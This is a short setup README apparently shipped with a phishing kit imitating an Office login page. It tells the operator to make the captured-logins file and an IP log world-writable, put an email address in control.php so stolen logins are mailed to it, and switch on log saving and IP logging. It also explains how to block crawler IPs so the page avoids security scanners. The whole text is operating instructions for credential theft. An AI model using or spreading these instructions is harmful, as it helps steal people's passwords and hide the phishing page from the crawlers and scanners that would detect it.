*)Chmod ips.txt (for ip logger) and

offc_l0gin_ajr592847921863.txt  [Logins]



 (for text loggin) to 777.



*)In control.php replace
$send="your email here";
by your email

e.g:
$send="abc@abc.com";

Also

*) LOGGING
xxxxxxxxxxx



$email_feature=1;  will turn on Emailing of log
$email_feature=0;  will turn off Emailing of log

$log_feature=0; will turn off saving of log on host
$log_feature=1; will turn on saving of log on host

$ip_logger=0;  will turn ip logger off
$ip_logger=1;  will turn ip logger on


$pageonline=0;  will turn page off
$pageonline=1;  will turn page on

----------------------------------------------------------------------------

*) if ip_logger is enabled
Each visit will save IP on ips.txt, you will have to clear your IP from ips.txt from re-enabling you or anyone to visit the link again


*)

Even if ip_logger is NOT enable, any IP that is present inside ips.txt will be blocked. In that way you can block known IP's of crawlers.


----------------------------------------------------------------------------
